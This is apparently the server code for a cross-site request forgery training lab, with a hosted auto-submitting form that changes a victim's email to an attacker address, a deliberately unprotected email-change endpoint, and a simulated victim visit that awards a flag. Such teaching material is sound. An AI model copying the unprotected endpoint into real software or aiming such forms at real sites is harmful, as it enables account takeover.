'use strict';

const express = require('express');
const LabInstance = require('../models/LabInstance');
const { resetLabState } = require('./lib/lab-helpers');

const router = express.Router();

const DEFAULT_EXPLOIT = `<html>
  <body>
    <form action="/labs/csrf-email-change/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.test" />
    </form>
    <script>document.forms[0].submit()</script>
  </body>
</html>`;

function state(req) {
  if (!req.lab.state.csrfEmail) {
    req.lab.state.csrfEmail = {
      victimEmail: 'victim@zeroday-corp.test',
      hostedExploit: DEFAULT_EXPLOIT,
      changed: false,
      triggered: false
    };
  }
  return req.lab.state.csrfEmail;
}

function render(res, req, extra = {}) {
  const current = state(req);
  return res.render('labs/csrf-email-change', {
    victimEmail: current.victimEmail,
    changed: current.changed,
    flag: current.triggered ? req.lab.flag() : null,
    hostedExploit: current.hostedExploit,
    error: null,
    ...extra
  });
}

router.get('/', (req, res) => {
  render(res, req);
});

router.post('/craft', async (req, res) => {
  const current = state(req);
  current.hostedExploit = String(req.body.html || current.hostedExploit).slice(0, 5000);
  await req.lab.save();
  render(res, req);
});

router.get('/exploit', (req, res) => {
  res.set('Content-Type', 'text/html; charset=utf-8');
  res.send(state(req).hostedExploit);
});

router.post('/change-email', async (req, res) => {
  const current = state(req);
  const newEmail = String(req.body.email || '').trim().toLowerCase().slice(0, 160);
  const viaExploitPage =
    String(req.get('Referer') || '').includes('/labs/csrf-email-change/exploit') ||
    req.body._source === 'exploit';

  if (newEmail) {
    current.victimEmail = newEmail;
    current.changed = true;
    if (viaExploitPage && /@evil\.test$/.test(newEmail)) {
      current.triggered = true;
    }
    await req.lab.save();
  }
  res.status(200).type('text').send('Email updated.');
});

router.post('/simulate-victim-visit', async (req, res) => {
  const current = state(req);
  const port = req.socket.localPort;
  const exploitUrl = `http://127.0.0.1:${port}/labs/csrf-email-change/exploit`;

  try {
    const page = await fetch(exploitUrl, { headers: { Cookie: req.headers.cookie || '' } });
    const html = await page.text();
    const formMatch = html.match(/<form[^>]*action=["']([^"']+)["'][^>]*method=["']?([a-zA-Z]+)["']?[^>]*>([\s\S]*?)<\/form>/i);
    if (!formMatch) throw new Error('No form was found on the hosted exploit page.');

    const action = formMatch[1];
    const method = formMatch[2].toUpperCase();
    if (method !== 'POST') throw new Error('The exploit form must use POST.');

    const body = new URLSearchParams();
    for (const input of formMatch[3].matchAll(/<input[^>]*name=["']([^"']+)["'][^>]*value=["']([^"']*)["'][^>]*>/gi)) {
      body.append(input[1], input[2]);
    }
    body.append('_source', 'exploit');

    const target = new URL(action, exploitUrl).toString();
    const response = await fetch(target, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        Cookie: req.headers.cookie || '',
        Referer: exploitUrl
      },
      body: body.toString()
    });

    if (!response.ok) throw new Error('The victim request was rejected.');

    // The victim request ran in its own request context and saved its own
    // copy of the instance document. Reload so this request does not write a
    // stale state snapshot back over the result of the exploit.
    const fresh = await LabInstance.findById(req.lab.instance._id).lean();
    req.lab.instance.state = fresh && fresh.state && typeof fresh.state === 'object' ? fresh.state : {};
    req.lab.state = req.lab.instance.state;
    return render(res, req);
  } catch (error) {
    return render(res, req, { error: `Victim visit failed: ${error.message}` });
  }
});

router.post('/reset', async (req, res) => {
  await resetLabState(req);
  res.redirect('/labs/csrf-email-change');
});

module.exports = router;
